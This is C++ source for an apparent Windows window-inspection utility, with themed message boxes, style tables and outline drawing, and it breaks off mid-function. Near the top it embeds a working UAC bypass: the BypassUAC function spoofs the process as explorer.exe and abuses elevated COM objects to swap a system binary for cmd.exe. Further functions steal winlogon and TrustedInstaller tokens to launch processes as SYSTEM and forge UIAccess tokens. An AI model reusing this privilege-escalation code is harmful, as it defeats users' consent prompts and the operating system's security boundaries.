#include <windows.h>
#include <dwmapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <Uxtheme.h>
#include <commctrl.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <ShlObj.h>
#include <winternl.h>
#include <VersionHelpers.h>
#include <cstdio>
#include <string_view>
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "Uxtheme.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#define HOTKEY_ID 1
using namespace std;
BOOL tmp;
HMENU hmenu;
POINT pt;
RECT rcMsgBox;
int style_ = 0, havehandle = 0, lastanswer = 0, isDarkThemeEnabled = false, DarkModeBGR = 0xF0F0F0, thickness = 6;
HWND parenthwnd, childhwnd,hmenuwnd, hwnd_,hprev,hborder,htip;
HBRUSH hBrush = CreateSolidBrush(RGB(240, 240, 240));
COLORREF bgColor = RGB(242, 247, 250);
COLORREF textColor = RGB(0, 0, 0);
COLORREF separatorColor = RGB(222, 222, 222);
COLORREF hoverColor = RGB(200, 222, 255);
COLORREF disabledColor = RGB(150, 150, 150);
COLORREF borderColor = RGB(255, 255, 255);
COLORREF darkBorderColor = RGB(225, 225, 225);
HHOOK g_hHook, hmshook, hkbhook;
HFONT TipFont = CreateFontA(18, 0, 0, 0, FW_NORMAL, 0, 0, 0, 1, 0, 0, 0, 0, "微软雅黑");
wstring message_, title_;
WNDPROC originalProc, originalbtnProc;
LPCWSTR attributes_name[] = { L"WS_OVERLAPPED",
L"WS_POPUP",
L"WS_CHILD",
L"WS_MINIMIZE",
L"WS_VISIBLE",
L"WS_DISABLED",
L"WS_CLIPSIBLINGS",
L"WS_CLIPCHILDREN",
L"WS_MAXIMIZE",
L"WS_CAPTION",
L"WS_BORDER",
L"WS_DLGFRAME",
L"WS_VSCROLL",
L"WS_HSCROLL",
L"WS_SYSMENU",
L"WS_THICKFRAME",
L"WS_GROUP",
L"WS_TABSTOP",
L"WS_MINIMIZEBOX",
L"WS_MAXIMIZEBOX",
L"WS_TILED",
L"WS_ICONIC",
L"WS_SIZEBOX",
L"WS_TILEDWINDOW",
L"WS_OVERLAPPEDWINDOW",
L"WS_POPUPWINDOW",
L"WS_CHILDWINDOW",
L"WS_EX_DLGMODALFRAME",
L"WS_EX_NOPARENTNOTIFY",
L"WS_EX_TOPMOST",
L"WS_EX_ACCEPTFILES",
L"WS_EX_TRANSPARENT",
L"WS_EX_MDICHILD",
L"WS_EX_TOOLWINDOW",
L"WS_EX_WINDOWEDGE",
L"WS_EX_CLIENTEDGE",
L"WS_EX_CONTEXTHELP",
L"WS_EX_RIGHT",
L"WS_EX_LEFT",
L"WS_EX_RTLREADING",
L"WS_EX_LTRREADING",
L"WS_EX_LEFTSCROLLBAR",
L"WS_EX_RIGHTSCROLLBAR",
L"WS_EX_CONTROLPARENT",
L"WS_EX_STATICEDGE",
L"WS_EX_APPWINDOW",
L"WS_EX_OVERLAPPEDWINDOW",
L"WS_EX_PALETTEWINDOW",
L"WS_EX_LAYERED",
L"WS_EX_NOINHERITLAYOUT",
L"WS_EX_NOREDIRECTIONBITMAP",
L"WS_EX_LAYOUTRTL",
L"WS_EX_COMPOSITED",
L"WS_EX_NOACTIVATE" };
LPCWSTR dwmwa_name[] = { L"DWMWA_NCRENDERING_POLICY",
L"DWMWA_TRANSITIONS_FORCEDISABLED",
L"DWMWA_ALLOW_NCPAINT",
L"DWMWA_NONCLIENT_RTL_LAYOUT",
L"DWMWA_FORCE_ICONIC_REPRESENTATION",
L"DWMWA_HAS_ICONIC_BITMAP",
L"DWMWA_DISALLOW_PEEK",
L"DWMWA_EXCLUDED_FROM_PEEK",
L"DWMWA_CLOAK",
L"DWMWA_USE_HOSTBACKDROPBRUSH",
L"DWMWA_USE_IMMERSIVE_DARK_MODE",
L"DWMWA_WINDOW_CORNER_PREFERENCE" };
LONG_PTR attributes_index[] = { 0x00000000,
0x80000000,
0x40000000,
0x20000000,
0x10000000,
0x08000000,
0x04000000,
0x02000000,
0x01000000,
0x00C00000,
0x00800000,
0x00400000,
0x00200000,
0x00100000,
0x00080000,
0x00040000,
0x00020000,
0x00010000,
0x00020000,
0x00010000,
WS_OVERLAPPED,
WS_MINIMIZE,
WS_THICKFRAME,
WS_OVERLAPPEDWINDOW,
WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX,
WS_POPUP | WS_BORDER | WS_SYSMENU,
WS_CHILD,
0x00000001,
0x00000004,
0x00000008,
0x00000010,
0x00000020,
0x00000040,
0x00000080,
0x00000100,
0x00000200,
0x00000400,
0x00001000,
0x00000000,
0x00002000,
0x00000000,
0x00004000,
0x00000000,
0x00010000,
0x00020000,
0x00040000,
WS_EX_WINDOWEDGE | WS_EX_CLIENTEDGE,
WS_EX_WINDOWEDGE | WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
0x00080000,
0x00100000,
0x00200000,
0x00400000,
0x02000000,
0x08000000 };
LONG_PTR dwmwa_index[] = { 2,
3,
4,
6,
7,
10,
11,
12,
13,
17,
20,
33 };
DWORD BypassUAC() {
	wchar_t szPath[MAX_PATH] = { 0 };
	GetModuleFileNameW(0, szPath, MAX_PATH);
	wstring path{ szPath }, curDir = path;
	PathRemoveFileSpecW(&curDir[0]);
	using RtlInitUnicodeStringPtr = void(NTAPI*)(PUNICODE_STRING, PCWSTR);
	using LDR_ENUM_CALLBACK = void(NTAPI*)(PVOID, PVOID, PBOOLEAN);
	using LdrEnumerateLoadedModulesPtr = NTSTATUS(NTAPI*)(ULONG, LDR_ENUM_CALLBACK, PVOID);
	const GUID IID_IeAxiAdminInstaller = { 0x9AEA8A59, 0xE0C9, 0x40F1, {0x87, 0xDD, 0x75, 0x70, 0x61, 0xD5, 0x61, 0x77} };
	struct IIEAdminBrokerObjectForAdminInstaller : IUnknown {
		virtual HRESULT InitializeAdminInstaller(LPWSTR, int, LPWSTR*) = 0;
	};
	struct IIEAdminBrokerObjectForInstaller2 : IUnknown {
		virtual HRESULT VerifyFile(LPWSTR, HWND, LPWSTR, LPWSTR, LPWSTR, ULONG, ULONG, const GUID&, LPWSTR*, PULONG, PUCHAR*) = 0;
		virtual HRESULT RunSetupCommand(LPWSTR, HWND, LPWSTR, LPWSTR, LPWSTR, LPWSTR, ULONG, PHANDLE) = 0;
	};
	struct LDR_CALLBACK_PARAMS {
		PCWCHAR ExplorerPath;
		PVOID ImageBase;
		RtlInitUnicodeStringPtr RtlInitUnicodeString;
	};
	PWSTR windowsPath, systemPath;
	SHGetKnownFolderPath(FOLDERID_Windows, 0, 0, &windowsPath);
	SHGetKnownFolderPath(FOLDERID_System, 0, 0, &systemPath);
	LPCWSTR explorer = L"C:\\Windows\\explorer.exe";
	wchar_t targetApp[MAX_PATH];
	GetModuleFileNameW(0, targetApp, MAX_PATH);
	wstring system32{ systemPath };
	const RtlInitUnicodeStringPtr RtlInitUnicodeString = RtlInitUnicodeStringPtr(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString"));
	const LdrEnumerateLoadedModulesPtr LdrEnumerateLoadedModules = LdrEnumerateLoadedModulesPtr(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "LdrEnumerateLoadedModules"));
	PBYTE const pPeb = *(PBYTE*)(PBYTE(NtCurrentTeb()) + 0x60);
	PRTL_USER_PROCESS_PARAMETERS pProcessParams = *(PRTL_USER_PROCESS_PARAMETERS*)(pPeb + 0x20);
	RtlInitUnicodeString(&pProcessParams->ImagePathName, explorer);
	RtlInitUnicodeString(&pProcessParams->CommandLine, L"explorer.exe");
	LDR_CALLBACK_PARAMS params{ explorer, GetModuleHandleW(0), RtlInitUnicodeString };
	LdrEnumerateLoadedModules(0, [](PVOID ldrEntry, PVOID context, PBOOLEAN stop) {
		LDR_CALLBACK_PARAMS* params = (LDR_CALLBACK_PARAMS*)(context);
		if (*PULONG_PTR(ULONG_PTR(ldrEntry) + 48) == ULONG_PTR(params->ImageBase)) {
			const PUNICODE_STRING baseName = PUNICODE_STRING(PBYTE(ldrEntry) + 88), fullName = PUNICODE_STRING(PBYTE(ldrEntry) + 72);
			params->RtlInitUnicodeString(baseName, L"explorer.exe");
			params->RtlInitUnicodeString(fullName, params->ExplorerPath);
			*stop = true;
		}}, &params);
		CoInitializeEx(0, 14);
		CoInitializeSecurity(0, -1, 0, 0, 2, 3, 0, 0, 0);
		IFileOperation* fileOperation;
		IIEAdminBrokerObjectForAdminInstaller* adminInstaller;
		BIND_OPTS3 bindOptions{};
		bindOptions.dwClassContext = 4;
		bindOptions.cbStruct = sizeof BIND_OPTS3;
		CoGetObject(L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}", &bindOptions, IID_IFileOperation, (void**)(&fileOperation));
		CoGetObject(L"Elevation:Administrator!new:{BDB57FF2-79B9-4205-9447-F5FE85F37312}", &bindOptions, IID_IeAxiAdminInstaller, (void**)(&adminInstaller));
		fileOperation->SetOperationFlags(276825104);
		system32 += L"\\bdeunlock.exe";
		LPWSTR instanceUuid;
		adminInstaller->InitializeAdminInstaller(0, 0, &instanceUuid);
		//IDC1.tmp <DIR> Created.
		IIEAdminBrokerObjectForInstaller2* installer2;
		adminInstaller->QueryInterface({ 0xBC0EC710, 0xA3ED, 0x4F99, {0xB1, 0x4F, 0x5F, 0xD5, 0x9F, 0xDA, 0xCE, 0xA3} }, reinterpret_cast<void**>(&installer2));
		LPWSTR fileName = SysAllocString(system32.c_str());
		LPWSTR targetFile;
		ULONG unknown5;
		PUCHAR unknown6;
		installer2->VerifyFile(instanceUuid, 0, fileName, fileName, 0, 2, 0, IID_IUnknown, &targetFile, &unknown5, &unknown6);
		//[1]bdeunlock.exe Created.
		wchar_t file[25], directory[MAX_PATH], drive[3], fullPath[MAX_PATH]{};
		_wsplitpath_s(targetFile, drive, 3, directory, MAX_PATH, file, 25, 0, 0);
		wcscat_s(file, 25, L".exe");
		wcscat_s(fullPath, 3, drive);
		wcscat_s(fullPath, MAX_PATH, directory);
		IShellItem* existingItem, * parentFolder, * newItem;
		system32 = system32.substr(0, system32.find(L"\\bdeunlock.exe"));
		system32 += L"\\cmd.exe";
		CopyFileW(system32.c_str(), file, false);
		int requiredSize = (GetCurrentDirectoryW(0, 0)) + wcslen(file) + 1;
		wchar_t* currentDirectory = new wchar_t[requiredSize];
		GetCurrentDirectoryW(requiredSize, currentDirectory);
		wcscat_s(currentDirectory, requiredSize, L"\\");
		wcscat_s(currentDirectory, requiredSize, file);
		SHCreateItemFromParsingName(currentDirectory, 0, IID_IShellItem, (void**)(&newItem));
		SHCreateItemFromParsingName(targetFile, 0, IID_IShellItem, (void**)(&existingItem));
		SHCreateItemFromParsingName(fullPath, 0, IID_IShellItem, (void**)(&parentFolder));
		fileOperation->DeleteItem(existingItem, 0);
		fileOperation->MoveItem(newItem, parentFolder, 0, 0);
		fileOperation->PerformOperations();
		//Copied cmd.exe
		system32 = system32.substr(0, system32.find(L"\\cmd.exe"));
		wstring commandLine{ targetFile };
		HANDLE exeHandle;
		commandLine += L" /c start " + wstring(PathFindFileNameW(szPath)) + L"";
		installer2->RunSetupCommand(instanceUuid, 0, SysAllocString(commandLine.c_str()), LPWSTR(L""), SysAllocString(curDir.c_str()), LPWSTR(L""), 0, &exeHandle);
		fileOperation->DeleteItem(existingItem, 0);
		fileOperation->PerformOperations();
		return GetLastError();
}
void log(const wchar_t* str, bool nl = true) {
	SYSTEMTIME tm;
	GetLocalTime(&tm);
	wcout << '[' << tm.wYear << '-' << tm.wMonth << '-' << tm.wDay << ' ' <<
		tm.wHour << ':' << tm.wMinute << ':' << tm.wSecond << '.' << tm.wMilliseconds << "] " << str << (nl ? "\n" : "");
}
bool CopyText(const std::wstring& text) {
	log((L"Coping Text: " + text).c_str());
	OpenClipboard(NULL);
	EmptyClipboard();
	HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE | GMEM_ZEROINIT, 65536);
	LPWSTR pBuffer = LPWSTR(GlobalLock(hGlobal));
	wcscpy_s(pBuffer, text.length() + 1, text.c_str());
	SetClipboardData(CF_UNICODETEXT, hGlobal);
	CloseClipboard();
	return GetLastError();
}
void ShowNotification(HWND hwnd, LPCWSTR title, LPCWSTR message, DWORD style) {
	NOTIFYICONDATAW nid = { 0 };
	nid.cbSize = sizeof(NOTIFYICONDATAW);
	nid.hWnd = hwnd;
	nid.uID = 1;
	nid.uFlags = NIF_INFO;
	nid.dwInfoFlags = style;
	wcscpy_s(nid.szInfoTitle, title);
	wcscpy_s(nid.szInfo, message);
	Shell_NotifyIconW(NIM_MODIFY, &nid);
}
HWND ShowMessageBoxThread(HWND hwnd, const wchar_t* message, LPCWSTR title, int style) {
	lastanswer = -1;
	message_ = (message == NULL ? L"错误" : message);
	title_ = title; style_ = style; hwnd_ = hwnd;
	CreateThread(0, 0, [](LPVOID lpParam) -> unsigned long {
		g_hHook = SetWindowsHookExW(5, [](int nCode, WPARAM wParam, LPARAM lParam) {
			if (nCode == HCBT_CREATEWND || nCode == HCBT_ACTIVATE) {
				havehandle = (int)wParam;
				UnhookWindowsHookEx(g_hHook);
			}
			return CallNextHookEx(g_hHook, nCode, wParam, lParam); }, 0, GetCurrentThreadId());
		lastanswer = MessageBoxExW(hwnd_, message_.c_str(), title_.c_str(), style_, MAKELANGID(LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED));
		return true; }, 0, 0, 0);
	MSG msg;
	while (!havehandle) {
		Sleep(10);
	}
	HWND hmsg = HWND(havehandle);
	havehandle = 0;
	SetWindowLongPtrW(hmsg, -20, GetWindowLongPtrW(hmsg, -20) | WS_EX_APPWINDOW);
	GetWindowRect(hmsg, &rcMsgBox);
	MoveWindow(hmsg, rcMsgBox.left, rcMsgBox.top, rcMsgBox.right - rcMsgBox.left, rcMsgBox.bottom - rcMsgBox.top, true);
	ShowWindow(hmsg, SW_SHOWDEFAULT);
	RECT rect;
	GetWindowRect(hmsg, &rect);
	SetWindowPos(hmsg, (style & MB_TOPMOST ? HWND_TOPMOST : HWND_TOP), rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, SWP_NOSIZE | SWP_NOMOVE | SWP_SHOWWINDOW);
	originalProc = WNDPROC(SetWindowLongPtrW(hmsg, -4, LONG_PTR(WNDPROC([](HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) -> LRESULT {
		switch (msg) {
		case WM_PAINT: {
			return DefWindowProcW(hwnd, msg, wParam, lParam);
		}
		case WM_COPY: {
			return DefWindowProcW(hwnd, msg, wParam, lParam);
		}
		case WM_RBUTTONUP: {
			POINT point;
			GetCursorPos(&point);
			int cmd = TrackPopupMenu(GetSystemMenu(hwnd, false), TPM_LEFTALIGN | TPM_TOPALIGN | TPM_RETURNCMD, point.x, point.y, 0, hwnd, 0);
			if (cmd) {
				SendMessageW(hwnd, WM_SYSCOMMAND, cmd, 0);
			}
		}
		case WM_SYSCOMMAND: {
			if (wParam == SC_KEYMENU) {
				return 1;
			}
			break;
		}
		case WM_LBUTTONDOWN: {
			ReleaseCapture();
			SendMessageW(hwnd, WM_SYSCOMMAND, SC_MOVE | HTCAPTION, 0);
			break;
		}
		case WM_CTLCOLORSTATIC: {
			SetTextColor((HDC)wParam, textColor);
			SetBkColor((HDC)wParam, bgColor);
			return (INT_PTR)hBrush;
		}
		case WM_CTLCOLORBTN: {
			SetTextColor((HDC)wParam, textColor);
			SetBkColor((HDC)wParam, bgColor);
			return (INT_PTR)hBrush;
		}
		case WM_CTLCOLORDLG: {
			SetBkColor((HDC)wParam, bgColor);
			return (INT_PTR)hBrush;
		}
		case WM_SETTINGCHANGE: {
			HKEY hKey;
			DWORD valueSize = sizeof(DWORD);
			RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize", 0, KEY_READ, &hKey);
			LONG result = RegGetValueW(hKey, 0, L"AppsUseLightTheme", RRF_RT_REG_DWORD, 0, &isDarkThemeEnabled, &valueSize);
			RegCloseKey(hKey);
			if (result == ERROR_SUCCESS) {
				isDarkThemeEnabled = (!isDarkThemeEnabled);
			}
			EnumChildWindows(hwnd, WNDENUMPROC([](HWND hWnd, LPARAM lparam) -> BOOL {
				if (isDarkThemeEnabled) {
					SetWindowTheme(hWnd, L"DarkMode_Explorer", NULL);
				}
				else {
					SetWindowTheme(hWnd, L"Explorer", NULL);
				}
				return true; }), 0);
			DwmSetWindowAttribute(hwnd, DWMWA_USE_IMMERSIVE_DARK_MODE, &isDarkThemeEnabled, sizeof(int));
			if (isDarkThemeEnabled) {
				hBrush = CreateSolidBrush(RGB(32, 32, 32));
				DarkModeBGR = 0x202020;
				DwmSetWindowAttribute(hwnd, DWMWA_CAPTION_COLOR, &DarkModeBGR, sizeof(int));
				bgColor = RGB(32, 32, 32);
				textColor = RGB(222, 222, 222);
				separatorColor = RGB(70, 70, 70);
				hoverColor = RGB(62, 62, 64);
				disabledColor = RGB(100, 100, 100);
				borderColor = RGB(80, 80, 80);
				darkBorderColor = RGB(40, 40, 40);
			}
			else {
				hBrush = CreateSolidBrush(RGB(240, 240, 240));
				DarkModeBGR = 0xF0F0F0;
				DwmSetWindowAttribute(hwnd, DWMWA_CAPTION_COLOR, &DarkModeBGR, sizeof(int));
				bgColor = RGB(242, 247, 250);
				textColor = RGB(0, 0, 0);
				separatorColor = RGB(222, 222, 222);
				hoverColor = RGB(200, 222, 255);
				disabledColor = RGB(150, 150, 150);
				borderColor = RGB(255, 255, 255);
				darkBorderColor = RGB(225, 225, 225);
			}
			RECT rect;
			GetClientRect(hwnd, &rect);
			FillRect(GetDC(hwnd), &rect, hBrush);
			break;
		}
		}
		return CallWindowProcW(originalProc, hwnd, msg, wParam, lParam);
		}))));
	SendMessageW(hmsg, WM_SETTINGCHANGE, 0, 0);
	HWND tmph = FindWindowExW(hmsg, FindWindowExW(hmsg, 0, L"Static", 0), L"Static", 0);
	if (tmph != NULL) {
		SendMessageW(tmph, WM_SETFONT, WPARAM(CreateFontA(30, 0, 0, 0, FW_NORMAL, 0, 0, 0, 1, 0, 0, 0, 0, "微软雅黑")), 1);
	}
	else {
		SendMessageW(FindWindowExW(hmsg, 0, L"Static", 0), WM_SETFONT, WPARAM(CreateFontA(30, 0, 0, 0, FW_NORMAL, 0, 0, 0, 1, 0, 0, 0, 0, "微软雅黑")), 1);
	}
	SendMessageW(FindWindowExW(hmsg, 0, L"Button", 0), WM_SETFONT, WPARAM(CreateFontA(20, 0, 0, 0, FW_NORMAL, 0, 0, 0, 1, 0, 0, 0, 0, "微软雅黑")), 1);
	SendMessageW(FindWindowExW(hmsg, FindWindowExW(hmsg, 0, L"Button", 0), L"Button", 0), WM_SETFONT, WPARAM(CreateFontA(19, 0, 0, 0, FW_NORMAL, 0, 0, 0, 1, 0, 0, 0, 0, "微软雅黑")), 1);
	SendMessageW(hmsg, WM_DEVMODECHANGE, 0, 0);
	return hmsg;
}
int FixedShowMessageBox(const wchar_t* message, LPCWSTR title, int style) {
	message_ = message;
	const wchar_t* start = message_.c_str();
	vector<wstring> lines;
	const wchar_t* current = message_.c_str();
	while (*current) {
		if (*current == L'\r' && *(current + 1) == L'\n') {
			lines.emplace_back(start, current);
			current += 2;
			start = current;
		}
		else if (*current == L'\n') {
			lines.emplace_back(start, current);
			current++;
			start = current;
		}
		else {
			current++;
		}
	}
	if (start != current) {
		lines.emplace_back(start, current);
	}
	int maxl = 0;
	wstring a = L"", longestLine;
	for (const auto& i : lines) {
		if (i.size() > maxl) {
			longestLine = i;
		}
		a += L"\n";
	}
	a.pop_back();
	for (int i = 0; i < (longestLine.size() * 4.2); ++i) {
		a += L"  ";
	}
	message_ = (wstring(message_) + a).c_str();
	HWND hwnd = ShowMessageBoxThread(0, message_.c_str(), title, style);
	MSG msg;
	log(L"MessageBox Created.");
	while (IsWindow(hwnd) && GetMessageW(&msg, 0, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
	log(L"End.");
	return lastanswer;
}
BOOL RunAsUser(LPCWSTR lpUser, LPCWSTR lpFileName, LPWSTR lpParameters) {
	SECURITY_ATTRIBUTES tAttr{};
	DWORD pid = 0, bytesNeed = 0;
	HANDLE hDupToken{}, hToken{};
	STARTUPINFOW si{};
	PROCESS_INFORMATION pi{};
	if (lpUser == L"Current Process") {
		OpenProcessToken(GetCurrentProcess(), 2, &hToken);
		DuplicateTokenEx(hToken, 983551, &tAttr, SecurityImpersonation, TokenImpersonation, &hDupToken);
		CreateProcessWithTokenW(hDupToken, 1, lpFileName, lpParameters, CREATE_NEW_CONSOLE, 0, 0, &si, &pi);
		return 0;
	}
	else {
		HANDLE hSnapshot = CreateToolhelp32Snapshot(2, 0);
		LUID luid{};
		PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
		SERVICE_STATUS_PROCESS bStatus{};
		si.lpDesktop = LPWSTR(L"WinSta0\\Default");
		if (Process32FirstW(hSnapshot, &pe)) {
			do {
				if (lpUser == L"System" || lpUser == L"TrustedInstaller") {
					if (wcscmp(pe.szExeFile, L"winlogon.exe") == 0) {
						pid = pe.th32ProcessID;
						break;
					}
				}
			} while (Process32NextW(hSnapshot, &pe));
		}
		OpenProcessToken(OpenProcess(4096, 0, pid), 2, &hToken);
		DuplicateTokenEx(hToken, 983551, &tAttr, SecurityImpersonation, TokenImpersonation, &hDupToken);
		if (lpUser == L"System") {
			CreateProcessWithTokenW(hDupToken, 1, lpFileName, lpParameters, CREATE_NEW_CONSOLE, 0, 0, &si, &pi);
			return 0;
		}
		if (lpUser == L"TrustedInstaller") {
			if (ImpersonateLoggedOnUser(hDupToken)) {
				SC_HANDLE hSCManager = OpenSCManagerW(0, SERVICES_ACTIVE_DATABASEW, 1), hService = OpenServiceW(hSCManager, L"TrustedInstaller", 20);
				while (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, LPBYTE(&bStatus), sizeof(bStatus), &bytesNeed)) {
					if (bStatus.dwCurrentState == 1) {
						StartServiceW(hService, 0, 0);
					}
					else if (bStatus.dwCurrentState == 4) {
						OpenProcessToken(OpenProcess(4096, 0, bStatus.dwProcessId), 2, &hToken);
						DuplicateTokenEx(hToken, 983551, &tAttr, SecurityImpersonation, TokenImpersonation, &hDupToken);
						CreateProcessWithTokenW(hDupToken, 1, lpFileName, lpParameters, CREATE_NEW_CONSOLE, 0, 0, &si, &pi);
						RevertToSelf();
						return 0;
					}
				}
			}
		}
	}
	return 0;
}
HWND hwndCur; 
DWORD DuplicateWinloginToken(DWORD dwSessionId, DWORD dwDesiredAccess, PHANDLE phToken) {
	DWORD dwErr;
	PRIVILEGE_SET ps;
	ps.PrivilegeCount = 1;
	ps.Control = PRIVILEGE_SET_ALL_NECESSARY;

	if (!LookupPrivilegeValue(NULL, SE_TCB_NAME, &ps.Privilege[0].Luid))
		return GetLastError();

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return GetLastError();

	BOOL bCont, bFound = FALSE;
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(pe);
	dwErr = ERROR_NOT_FOUND;

	for (bCont = Process32First(hSnapshot, &pe); bCont; bCont = Process32Next(hSnapshot, &pe)) { //loop system processes
		HANDLE hProcess;
		if (0 != lstrcmpW(pe.szExeFile, TEXT("winlogon.exe")))
			continue;

		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
		if (!hProcess)
			continue;

		HANDLE hToken;
		DWORD dwRetLen, sid;
		if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
			BOOL fTcb;
			if (PrivilegeCheck(hToken, &ps, &fTcb) && fTcb) {
				if (GetTokenInformation(hToken, TokenSessionId, &sid, sizeof(sid), &dwRetLen) && sid == dwSessionId) {
					bFound = TRUE;
					if (DuplicateTokenEx(hToken, dwDesiredAccess, NULL, SecurityImpersonation, TokenImpersonation, phToken)) {
						dwErr = ERROR_SUCCESS;
					}
					else {
						dwErr = GetLastError();
					}
				}
			}
			CloseHandle(hToken);
		}
		CloseHandle(hProcess);
		if (bFound) { break; } //MessageBoxA(NULL, "winlogon.exe system token found.", "Debug Window", MB_ICONINFORMATION | MB_OK);
	}

	CloseHandle(hSnapshot);
	return dwErr;
}
DWORD CreateUIAccessToken(PHANDLE phToken) {
	DWORD dwSessionId, dwRetLen, dwErr;
	HANDLE hTokenSelf, hTokenSystem;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE, &hTokenSelf))
		return GetLastError();

	if (!GetTokenInformation(hTokenSelf, TokenSessionId, &dwSessionId, sizeof(dwSessionId), &dwRetLen))
		return GetLastError();

	dwErr = DuplicateWinloginToken(dwSessionId, TOKEN_IMPERSONATE, &hTokenSystem);
	if (ERROR_SUCCESS != dwErr)
		return ERROR_NOT_FOUND;

	if (SetThreadToken(NULL, hTokenSystem)) {
		if (DuplicateTokenEx(hTokenSelf, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT, NULL, SecurityAnonymous, TokenPrimary, phToken)) {
			BOOL bUIAccess = TRUE;
			if (!SetTokenInformation(*phToken, TokenUIAccess, &bUIAccess, sizeof(bUIAccess))) {
				dwErr = GetLastError();
				CloseHandle(*phToken);
			} //else { MessageBoxA(NULL, "Ui Accesss Token Duplicated.", "Debug Window", MB_ICONINFORMATION | MB_OK); }
		}
		else {
			dwErr = GetLastError();
		}
		RevertToSelf();
	}
	else {
		dwErr = GetLastError();
	}
	CloseHandle(hTokenSystem);
	CloseHandle(hTokenSelf);
	return dwErr;
}
DWORD PrepareForUIAccess() {
	DWORD dwErr, dwUIAccess;
	HANDLE hTokenUIAccess, hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		DWORD dwRetLen;
		if (GetTokenInformation(hToken, TokenUIAccess, &dwUIAccess, sizeof(dwUIAccess), &dwRetLen)) {
			if (dwUIAccess) {
				return ERROR_SUCCESS;
			}
		}
		else {
			return GetLastError();
		}
		CloseHandle(hToken);
	}
	else {
		return GetLastError();
	}
	if (CreateUIAccessToken(&hTokenUIAccess)) return GetLastError();
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	GetStartupInfoW(&si);
	if (CreateProcessAsUserW(hTokenUIAccess, NULL, GetCommandLine(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		CloseHandle(pi.hProcess), CloseHandle(pi.hThread);
		ExitProcess(0);
	}
	else {
		return GetLastError();
	}
	return dwErr;
}
// 在窗口上绘制透明红色边框
void DrawWindowOutline(HWND hwnd, COLORREF color) {
    if (hborder && IsWindow(hborder)) DestroyWindow(hborder);
    RECT rect;
    GetWindowRect(hwnd, &rect);
    int w = rect.right - rect.left + thickness * 2;
    int h = rect.bottom - rect.top + thickness * 2;
    hborder = CreateWindowExW(WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TRANSPARENT, L"STATIC", 0, WS_POPUP | WS_VISIBLE,rect.left, rect.top, w, h, 0, 0, GetModuleHandleW(0), 0);
    SetWindowLongPtrW(hborder, GWLP_USERDATA, (LONG_PTR)color);
    SetWindowLongPtrW(hborder, GWLP_WNDPROC, LONG_PTR(WNDPROC([](HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) -> LRESULT {
        switch (msg) {
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            RECT rc;
            GetClientRect(hwnd, &rc);
            HBRUSH hWhite = CreateSolidBrush(RGB(255, 255, 255));
            FillRect(hdc, &rc, hWhite);
            DeleteObject(hWhite);
            COLORREF col = (COLORREF)GetWindowLongPtrW(hwnd, GWLP_USERDATA);
            HBRUSH hBorder = CreateSolidBrush(col);
			rc.left += thickness/2;
			rc.top += thickness/2;
			rc.right -= thickness/2;
			rc.bottom -= thickness/2;
            RECT rtop = { rc.left, rc.top, rc.right, rc.top + thickness };
            FillRect(hdc, &rtop, hBorder);
            RECT rbot = { rc.left, rc.bottom - thickness, rc.right, rc.bottom };
            FillRect(hdc, &rbot, hBorder);
            RECT rleft = { rc.left, rc.top, rc.left + thickness, rc.bottom };
            FillRect(hdc, &rleft, hBorder);
            RECT rright = { rc.right - thickness, rc.top, rc.right, rc.bottom };
            FillRect(hdc, &rright, hBorder);
            DeleteObject(hBorder);
            EndPaint(hwnd, &ps);
            return 0;
        }
        case WM_ERASEBKGND: {
            return 1;
        }
        }
        return DefWindowProcW(hwnd, msg, wParam, lParam);
    })));
    SetWindowPos(hborder, HWND_TOPMOST, rect.left - thickness, rect.top - thickness, w, h, SWP_SHOWWINDOW);
	SetLayeredWindowAttributes(hborder, 0xFFFFFF, 0, LWA_COLORKEY);
    //InvalidateRect(hborder, NULL, TRUE);
}
int GetTextHeight(HFONT hFont, LPCWSTR text) {
    RECT rect = { 0, 0, 680, 0 };
    HDC hdc = GetDC(GetDesktopWindow());
    if (!hdc) return 0;
    HFONT hOld = (HFONT)SelectObject(hdc, hFont);
    DrawTextW(hdc, text, -1, &rect, DT_CALCRECT | DT_WORDBREAK | DT_LEFT | DT_TOP);
    SelectObject(hdc, hOld);
    ReleaseDC(GetDesktopWindow(), hdc);
    return (rect.bottom - rect.top)+4;
}
int GetTextWidth(HFONT hFont, LPCWSTR text) {
